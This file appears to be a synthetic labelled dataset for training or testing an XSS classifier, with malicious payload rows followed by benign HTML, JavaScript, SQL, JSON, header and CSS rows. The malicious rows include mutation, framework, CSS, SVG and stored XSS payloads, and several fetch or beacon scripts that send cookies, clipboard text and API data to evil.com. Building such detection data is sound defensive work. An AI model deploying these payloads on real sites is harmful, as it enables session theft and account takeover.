+"<math><mtext><table><mglyph><svg><mtext><style><path id=""</style><img onerror=alert(1) src>"">",1,mutation_xss,synthetic_harshit_2025
+<div><math><mi><img src=x onerror=alert(1)></mi></math></div>,1,mutation_xss,synthetic_harshit_2025
+<p><math alttext=</p><img src=x onerror=alert(1)></math>,1,mutation_xss,synthetic_harshit_2025
+<frameset onload=alert(1)>,1,mutation_xss,synthetic_harshit_2025
+"<svg><animate attributeName=attributeName values=""&#34;><script>alert(1)</script>&#34;""/>",1,mutation_xss,synthetic_harshit_2025
+"<div ng-app ng-csp>{{$eval.constructor(""alert(1)"")()}}",1,framework_xss,synthetic_harshit_2025
+"<div ng-app>{{""a"".constructor.prototype.charAt=[].join;$eval(""x=alert(1)"")}}</div>",1,framework_xss,synthetic_harshit_2025
+"ng-init=""constructor.constructor('alert(1)')()""",1,framework_xss,synthetic_harshit_2025
+"<div ng-app ng-controller=""x"">{{$on.constructor(""alert(1)"")()}}</div>",1,framework_xss,synthetic_harshit_2025
+"<div class=ng-include:""'data:,alert(1)'""></div>",1,framework_xss,synthetic_harshit_2025
+"<script>ReactDOM.render(React.createElement(""div"",{dangerouslySetInnerHTML:{__html:""<img src=x onerror=alert(1)>""}}),document.body)</script>",1,framework_xss,synthetic_harshit_2025
+<div dangerouslySetInnerHTML={{__html: userInput}}></div>,1,framework_xss,synthetic_harshit_2025
+"[[constructor.constructor(""alert(1)"")()]]",1,framework_xss,synthetic_harshit_2025
+"<nuxt-link to=""javascript:alert(1)"">click</nuxt-link>",1,framework_xss,synthetic_harshit_2025
+"<svelte:element this=""script"">alert(1)</svelte:element>",1,framework_xss,synthetic_harshit_2025
+"<component :is=""'script'"">alert(1)</component>",1,framework_xss,synthetic_harshit_2025
+"<div @click=""eval(userInput)"">click</div>",1,framework_xss,synthetic_harshit_2025
+"ng-app><script>angular.module(""a"",[]).run(function($rootScope,$compile){$compile(""<div>{{constructor.constructor('alert(1)')()}}</div>"")($rootScope).$appendTo(document.body)})</script>",1,framework_xss,synthetic_harshit_2025
+"<script>window.__vue_app__.config.globalProperties.$emit(""xss"",""<img src=x onerror=alert(1)>"")</script>",1,framework_xss,synthetic_harshit_2025
+<style>*{background-image:url(javascript:alert(1))}</style>,1,css_injection_xss,synthetic_harshit_2025
+<style>body{behavior:url(xss.htc)}</style>,1,css_injection_xss,synthetic_harshit_2025
+<style>li{list-style-image:url(javascript:alert(1))}</style>,1,css_injection_xss,synthetic_harshit_2025
+"<div style=""background:url(javascript:alert(1))"">",1,css_injection_xss,synthetic_harshit_2025
+"<div style=""width:expression(alert(1))"">",1,css_injection_xss,synthetic_harshit_2025
+"<div style=""background-image:expression(alert(1))"">",1,css_injection_xss,synthetic_harshit_2025
+"<style>@import ""javascript:alert(1)""</style>",1,css_injection_xss,synthetic_harshit_2025
+<style>@import url(javascript:alert(1))</style>,1,css_injection_xss,synthetic_harshit_2025
+<link rel=stylesheet href=javascript:alert(1)>,1,css_injection_xss,synthetic_harshit_2025
+"<link rel=stylesheet href=""data:text/css,*{background-image:url(javascript:alert(1))}"">",1,css_injection_xss,synthetic_harshit_2025
+"<style>div:-moz-any-link{cursor:url(javascript:alert(1)),auto}</style>",1,css_injection_xss,synthetic_harshit_2025
+"<div style=""-moz-binding:url(http://evil.com/xss.xml#xss)"">",1,css_injection_xss,synthetic_harshit_2025
+<style>*{x:expression(alert(1))}</style>,1,css_injection_xss,synthetic_harshit_2025
+"<style>body:before{content:url(data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)}</style>",1,css_injection_xss,synthetic_harshit_2025
+"<script>fetch(""https://evil.com/steal?c=""+document.cookie)</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>fetch(""/api/user"").then(r=>r.json()).then(d=>fetch(""https://evil.com/""+btoa(JSON.stringify(d))))</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>fetch(location.href).then(r=>r.text()).then(t=>fetch(""https://evil.com/page?d=""+btoa(t)))</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>fetch(""/admin"",{credentials:""include""}).then(r=>r.text()).then(d=>new Image().src=""//evil.com/?""+btoa(d))</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>navigator.sendBeacon(""https://evil.com/steal"",document.cookie)</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>new XMLHttpRequest().open(""GET"",""https://evil.com/?c=""+document.cookie,true)</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>fetch(""/api/change-password"",{method:""POST"",body:JSON.stringify({password:""hacked""}),credentials:""include"",headers:{""Content-Type"":""application/json""}})</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>var r=new Request(""//evil.com/?c=""+document.cookie);fetch(r)</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>new EventSource(""//evil.com/sse?c=""+document.cookie)</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>var ws=new WebSocket(""wss://evil.com"");ws.onopen=()=>ws.send(document.cookie)</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>navigator.clipboard.readText().then(t=>fetch(""//evil.com/?clip=""+t))</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>document.cookie.split("";"").forEach(c=>new Image().src=""//evil.com/?""+c)</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>fetch(""/graphql"",{method:""POST"",body:""{me{email password}}"",credentials:""include""}).then(r=>r.json()).then(d=>fetch(""//evil.com/""+btoa(JSON.stringify(d))))</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>import(""//evil.com/xss.mjs"").then(m=>m.x())</script>",1,fetch_api_abuse,synthetic_harshit_2025
+"<script>Promise.all([fetch(""/api/profile"",{credentials:""include""}),fetch(""/api/keys"",{credentials:""include""})]).then(rs=>Promise.all(rs.map(r=>r.json()))).then(ds=>fetch(""//evil.com/""+btoa(JSON.stringify(ds))))</script>",1,fetch_api_abuse,synthetic_harshit_2025
+<svg><script>alert(1)</script></svg>,1,svg_advanced,synthetic_harshit_2025
+"<svg xmlns=""http://www.w3.org/2000/svg""><script>alert(1)</script></svg>",1,svg_advanced,synthetic_harshit_2025
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>,1,svg_advanced,synthetic_harshit_2025
+<svg><set onbegin=alert(1) attributeName=x>,1,svg_advanced,synthetic_harshit_2025
+<svg id=x><use href=#x onload=alert(1)>,1,svg_advanced,synthetic_harshit_2025
+<svg><image href=1 onerror=alert(1)>,1,svg_advanced,synthetic_harshit_2025
+<svg><a href=javascript:alert(1)><text y=20>click me</text></a></svg>,1,svg_advanced,synthetic_harshit_2025
+<svg><foreignObject><body xmlns=http://www.w3.org/1999/xhtml><script>alert(1)</script></body></foreignObject></svg>,1,svg_advanced,synthetic_harshit_2025
+<svg><desc><![CDATA[><script>alert(1)</script>]]></desc></svg>,1,svg_advanced,synthetic_harshit_2025
+<svg onload=alert(1) xmlns=http://www.w3.org/2000/svg>,1,svg_advanced,synthetic_harshit_2025
+<math><maction actiontype=statusline#http://evil.com xlink:href=javascript:alert(1)>click,1,svg_advanced,synthetic_harshit_2025
+<svg><script>alert&#40;1&#41;</script>,1,svg_advanced,synthetic_harshit_2025
+<svg><script>&#x61;lert(1)</script></svg>,1,svg_advanced,synthetic_harshit_2025
+"<svg><use xlink:href=""data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+#x"">",1,svg_advanced,synthetic_harshit_2025
+"<img src=""https://legitimate.com/image.jpg"" onerror=""fetch('https://evil.com/?c='+document.cookie)"">",1,stored_xss,synthetic_harshit_2025
+"Hello! <script>setTimeout(function(){fetch(""https://evil.com/steal?c=""+document.cookie)},5000)</script>",1,stored_xss,synthetic_harshit_2025
+"<a href=""#"" onclick=""var img=new Image();img.src='https://evil.com/?c='+document.cookie;return false;"">Click for discount!</a>",1,stored_xss,synthetic_harshit_2025
+"Great product! <img src=x style=""display:none"" onerror=""navigator.sendBeacon('https://evil.com',document.cookie)"">",1,stored_xss,synthetic_harshit_2025
+"<span class=""rating"">5 stars</span><script>document.addEventListener(""DOMContentLoaded"",function(){fetch(""https://evil.com/""+btoa(document.cookie))})</script>",1,stored_xss,synthetic_harshit_2025
+"<b>Nice article</b><svg/onload=""var s=document.createElement('script');s.src='//evil.com/xss.js';document.head.appendChild(s)"">",1,stored_xss,synthetic_harshit_2025
+"<p>Comment text here</p><iframe srcdoc=""<script>top.fetch('https://evil.com/?c='+top.document.cookie)</script>"" width=0 height=0>",1,stored_xss,synthetic_harshit_2025
+"<div class=""user-bio"">Developer<script>if(!sessionStorage.xss){sessionStorage.xss=1;fetch(""//evil.com/?c=""+document.cookie)}</script></div>",1,stored_xss,synthetic_harshit_2025
+"<img src=""https://normal.com/img.jpg"" onload=""this.onload=null;document.body.appendChild(Object.assign(document.createElement('script'),{src:'//evil.com/xss.js'}))"">",1,stored_xss,synthetic_harshit_2025
+"<script>if(window.top===window.self){new Image().src=""//evil.com/?c=""+document.cookie}</script>",1,stored_xss,synthetic_harshit_2025
+"<div class=""container""><h1>Welcome to our website</h1><p>Please login to continue.</p></div>",0,benign_diverse,synthetic_harshit_2025
+"<form action=""/login"" method=""POST""><input type=""text"" name=""username"" placeholder=""Enter username""><input type=""password"" name=""password""><button type=""submit"">Login</button></form>",0,benign_diverse,synthetic_harshit_2025
+"<nav class=""navbar""><a href=""/home"">Home</a><a href=""/about"">About</a><a href=""/contact"">Contact</a></nav>",0,benign_diverse,synthetic_harshit_2025
+"<table class=""data-table""><thead><tr><th>Name</th><th>Email</th><th>Role</th></tr></thead><tbody><tr><td>John</td><td>john@example.com</td><td>Admin</td></tr></tbody></table>",0,benign_diverse,synthetic_harshit_2025
+"<input type=""email"" name=""email"" value=""user@example.com"" class=""form-control"" required>",0,benign_diverse,synthetic_harshit_2025
+"<button class=""btn btn-primary"" type=""button"">Submit</button>",0,benign_diverse,synthetic_harshit_2025
+"<img src=""/images/logo.png"" alt=""Company Logo"" class=""logo"" width=""200"" height=""50"">",0,benign_diverse,synthetic_harshit_2025
+"<a href=""https://www.example.com/page?id=123&category=tech"" target=""_blank"" rel=""noopener"">Read more</a>",0,benign_diverse,synthetic_harshit_2025
+"<link rel=""stylesheet"" href=""/css/main.css"" type=""text/css"">",0,benign_diverse,synthetic_harshit_2025
+"<meta name=""description"" content=""A safe website with useful content for users"">",0,benign_diverse,synthetic_harshit_2025
+"<select name=""country"" id=""country-select""><option value=""us"">United States</option><option value=""uk"">United Kingdom</option></select>",0,benign_diverse,synthetic_harshit_2025
+"<div class=""alert alert-success"" role=""alert"">Your profile has been updated successfully!</div>",0,benign_diverse,synthetic_harshit_2025
+"<header class=""site-header""><div class=""brand""><h1>My Site</h1></div></header>",0,benign_diverse,synthetic_harshit_2025
+"<footer class=""site-footer""><p>Contact us at: <a href=""mailto:info@example.com"">info@example.com</a></p></footer>",0,benign_diverse,synthetic_harshit_2025
+"<p class=""text-muted"">Last updated: January 15, 2025. All rights reserved.</p>",0,benign_diverse,synthetic_harshit_2025
+"<section id=""about""><h2>About Us</h2><p>We are a security-focused company.</p></section>",0,benign_diverse,synthetic_harshit_2025
+"<ul class=""list-group""><li class=""list-group-item"">Item one</li><li class=""list-group-item"">Item two</li></ul>",0,benign_diverse,synthetic_harshit_2025
+"<div class=""card""><div class=""card-body""><h5 class=""card-title"">Card title</h5><p class=""card-text"">Card content here.</p></div></div>",0,benign_diverse,synthetic_harshit_2025
+function validateEmail(email) { const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; return re.test(email); },0,benign_diverse,synthetic_harshit_2025
+"const API_URL = ""https://api.example.com/v1""; const headers = { ""Content-Type"": ""application/json"" };",0,benign_diverse,synthetic_harshit_2025
+"document.addEventListener(""DOMContentLoaded"", function() { const form = document.getElementById(""login-form""); form.addEventListener(""submit"", handleSubmit); });",0,benign_diverse,synthetic_harshit_2025
+"var userData = JSON.parse(localStorage.getItem(""user"")) || {}; if (userData.isLoggedIn) { showDashboard(); }",0,benign_diverse,synthetic_harshit_2025
+"async function loadData(userId) { const response = await fetch(""/api/users/"" + userId, { credentials: ""same-origin"" }); if (!response.ok) throw new Error(""Network error""); return response.json(); }",0,benign_diverse,synthetic_harshit_2025
+"class UserService { constructor(baseUrl) { this.baseUrl = baseUrl; } async getUser(id) { return fetch(this.baseUrl + ""/users/"" + id).then(r => r.json()); } }",0,benign_diverse,synthetic_harshit_2025
+const handleSubmit = (e) => { e.preventDefault(); const formData = new FormData(e.target); const data = Object.fromEntries(formData); console.log(data); };,0,benign_diverse,synthetic_harshit_2025
+"import React, { useState, useEffect } from ""react""; function App() { const [count, setCount] = useState(0); return <button onClick={() => setCount(c => c + 1)}>{count}</button>; }",0,benign_diverse,synthetic_harshit_2025
+"window.addEventListener(""resize"", debounce(function() { updateLayout(); }, 250));",0,benign_diverse,synthetic_harshit_2025
+"const sanitize = (str) => str.replace(/[&<>""']/g, m => ({""&"":""&amp;"",""<"":""&lt;"","">"":""&gt;"",'""':""&quot;"",""'"":""&#39;""}[m]));",0,benign_diverse,synthetic_harshit_2025
+"export default function Button({ onClick, children, disabled }) { return <button onClick={onClick} disabled={disabled} className=""btn"">{children}</button>; }",0,benign_diverse,synthetic_harshit_2025
+"const router = express.Router(); router.get(""/users"", authenticate, async (req, res) => { const users = await User.findAll(); res.json(users); });",0,benign_diverse,synthetic_harshit_2025
+"try { const result = await db.query(""SELECT * FROM users WHERE id = $1"", [userId]); return result.rows[0]; } catch (err) { logger.error(err); throw err; }",0,benign_diverse,synthetic_harshit_2025
+"SELECT u.id, u.name, u.email FROM users u WHERE u.active = 1 AND u.role = ""user"" ORDER BY u.created_at DESC LIMIT 10;",0,benign_diverse,synthetic_harshit_2025
+"INSERT INTO orders (user_id, product_id, quantity, price) VALUES (?, ?, ?, ?);",0,benign_diverse,synthetic_harshit_2025
+"UPDATE users SET last_login = NOW(), login_count = login_count + 1 WHERE id = ? AND active = 1;",0,benign_diverse,synthetic_harshit_2025
+"SELECT p.name, p.price, c.name as category FROM products p JOIN categories c ON p.category_id = c.id WHERE p.price BETWEEN 10 AND 100;",0,benign_diverse,synthetic_harshit_2025
+"CREATE TABLE sessions (id VARCHAR(64) PRIMARY KEY, user_id INT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, expires_at TIMESTAMP NOT NULL);",0,benign_diverse,synthetic_harshit_2025
+DELETE FROM tokens WHERE expires_at < NOW() AND user_id = ?;,0,benign_diverse,synthetic_harshit_2025
+"SELECT COUNT(*) as total, AVG(rating) as avg_rating FROM reviews WHERE product_id = ? GROUP BY product_id;",0,benign_diverse,synthetic_harshit_2025
+ALTER TABLE users ADD COLUMN two_factor_secret VARCHAR(32) DEFAULT NULL;,0,benign_diverse,synthetic_harshit_2025
+"SELECT * FROM audit_logs WHERE user_id = ? AND action IN (""login"",""logout"",""password_change"") ORDER BY created_at DESC;",0,benign_diverse,synthetic_harshit_2025
+CREATE INDEX idx_sessions_user ON sessions(user_id); CREATE INDEX idx_sessions_expires ON sessions(expires_at);,0,benign_diverse,synthetic_harshit_2025
+"{""status"": ""success"", ""data"": {""user_id"": 12345, ""username"": ""john_doe"", ""email"": ""john@example.com"", ""role"": ""user""}}",0,benign_diverse,synthetic_harshit_2025
+"{""error"": false, ""message"": ""Profile updated successfully"", ""timestamp"": ""2025-01-15T10:30:00Z""}",0,benign_diverse,synthetic_harshit_2025
+"[{""id"": 1, ""name"": ""Product A"", ""price"": 29.99, ""stock"": 150}, {""id"": 2, ""name"": ""Product B"", ""price"": 49.99, ""stock"": 75}]",0,benign_diverse,synthetic_harshit_2025
+"{""access_token"": ""eyJhbGciOiJIUzI1NiJ9.payload.signature"", ""token_type"": ""Bearer"", ""expires_in"": 3600}",0,benign_diverse,synthetic_harshit_2025
+"{""page"": 1, ""per_page"": 20, ""total"": 1500, ""data"": [{""id"": 1, ""title"": ""First item""}]}",0,benign_diverse,synthetic_harshit_2025
+"{""errors"": [{""field"": ""email"", ""message"": ""Email already exists""}, {""field"": ""password"", ""message"": ""Too short""}]}",0,benign_diverse,synthetic_harshit_2025
+"{""csrf_token"": ""abc123def456"", ""expires_at"": ""2025-01-15T11:30:00Z""}",0,benign_diverse,synthetic_harshit_2025
+The user successfully logged in and was redirected to the dashboard page.,0,benign_diverse,synthetic_harshit_2025
+Please enter your email address and password to access your account securely.,0,benign_diverse,synthetic_harshit_2025
+"Your password must be at least 8 characters long and contain uppercase, lowercase, numbers, and special characters.",0,benign_diverse,synthetic_harshit_2025
+The session has expired. Please log in again to continue using the application.,0,benign_diverse,synthetic_harshit_2025
+Click the link in your email to verify your account and complete the registration process.,0,benign_diverse,synthetic_harshit_2025
+We have sent a password reset link to the email address associated with your account.,0,benign_diverse,synthetic_harshit_2025
+Your account has been locked due to multiple failed login attempts. Please contact support.,0,benign_diverse,synthetic_harshit_2025
+Two-factor authentication has been enabled for your account. You will receive a code via SMS.,0,benign_diverse,synthetic_harshit_2025
+Access denied. You do not have permission to view this resource. Contact your administrator.,0,benign_diverse,synthetic_harshit_2025
+Invalid CSRF token. Your request could not be processed. Please refresh the page and try again.,0,benign_diverse,synthetic_harshit_2025
+Cross-Site Request Forgery protection is active on this application.,0,benign_diverse,synthetic_harshit_2025
+All user inputs are sanitized and escaped before being stored in the database.,0,benign_diverse,synthetic_harshit_2025
+The application uses Content Security Policy headers to prevent XSS attacks.,0,benign_diverse,synthetic_harshit_2025
+Passwords are hashed using bcrypt before storage. Never store plaintext passwords.,0,benign_diverse,synthetic_harshit_2025
+Rate limiting is applied to all authentication endpoints to prevent brute force attacks.,0,benign_diverse,synthetic_harshit_2025
+Content-Type: application/json; charset=utf-8,0,benign_diverse,synthetic_harshit_2025
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature,0,benign_diverse,synthetic_harshit_2025
+X-Content-Type-Options: nosniff,0,benign_diverse,synthetic_harshit_2025
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload,0,benign_diverse,synthetic_harshit_2025
+"Content-Security-Policy: default-src ""self""; script-src ""self"" ""nonce-abc123""; style-src ""self"" ""unsafe-inline""",0,benign_diverse,synthetic_harshit_2025
+Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600,0,benign_diverse,synthetic_harshit_2025
+X-Frame-Options: DENY,0,benign_diverse,synthetic_harshit_2025
+"Cache-Control: no-store, no-cache, must-revalidate, private",0,benign_diverse,synthetic_harshit_2025
+Referrer-Policy: strict-origin-when-cross-origin,0,benign_diverse,synthetic_harshit_2025
+"Permissions-Policy: geolocation=(), microphone=(), camera=()",0,benign_diverse,synthetic_harshit_2025
+.container { max-width: 1200px; margin: 0 auto; padding: 0 15px; box-sizing: border-box; },0,benign_diverse,synthetic_harshit_2025
+@media (max-width: 768px) { .navbar { display: none; } .mobile-menu { display: block; } },0,benign_diverse,synthetic_harshit_2025
+.btn-primary { background-color: #0066cc; color: #ffffff; padding: 10px 20px; border-radius: 4px; cursor: pointer; },0,benign_diverse,synthetic_harshit_2025
+":root { --primary-color: #0066cc; --secondary-color: #6c757d; --font-family: ""Arial"", sans-serif; }",0,benign_diverse,synthetic_harshit_2025
+".form-input:focus { outline: none; border-color: #0066cc; box-shadow: 0 0 0 3px rgba(0,102,204,0.25); }",0,benign_diverse,synthetic_harshit_2025
+".sr-only { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0,0,0,0); }",0,benign_diverse,synthetic_harshit_2025
